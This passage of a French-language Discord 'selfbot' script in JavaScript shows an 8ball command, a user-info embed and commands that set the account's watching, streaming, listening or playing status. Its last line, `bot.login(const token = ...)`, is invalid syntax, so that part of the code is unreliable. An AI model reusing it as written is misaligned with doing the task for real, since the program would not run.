    .addField("🔥 𝐃𝐚𝐭𝐞 𝐝𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐝𝐞 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 !:", mention.user.createdAt)
    .addField("🔥 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed); 
    }

    
    if (cmd === prefix + "8ball"){
        if (!args[1]) return message.reply("Tu n'as pas posé de question !");
    
        let replies = ["Oui", "Non", "Peux être", "Je ne sais pas", "C'est impossible !", "Probablement..", "Hors de question !", "Pourquoi pas?"]
        let question = args.slice(0).join(" ");
        let res = Math.floor((Math.random() * replies.length));
    
        let bembed = new Discord.RichEmbed()
            .setColor('#cee4e6')
            .setTitle("🌴 𝐒𝐧𝐨𝐭𝐢 𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗮𝘁𝗶𝗼𝗻s 🌴")
            .setFooter("© SelfBot by 𝐒𝐧𝐨𝐭𝐢")
            .setThumbnail("https://imgur.com/aCX2XF0")
            .addField(`Question de ${message.author.tag}`, question)
            .addField("Réponse : ", replies[res])
            message.channel.sendEmbed(bembed);
        }
    
        if ( cmd === prefix + "watch") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let WatchTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"})
        }
    
        if ( cmd === prefix + "stream") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let StreamTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/cincinbear'})
        }
    
        if ( cmd === prefix + "listen") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let ListenTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${ListenTime}`, {type: "LISTENING"})
        }
        if ( cmd === prefix + "play") {
            if (message.author.id != `${ClientID}`) return;

            if (message.deletable) message.delete();
            if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
    
            let PlayTime = args.slice(0).join(" ");
    
            bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"})
        }

});

bot.login(const token = process.env.TOKEN);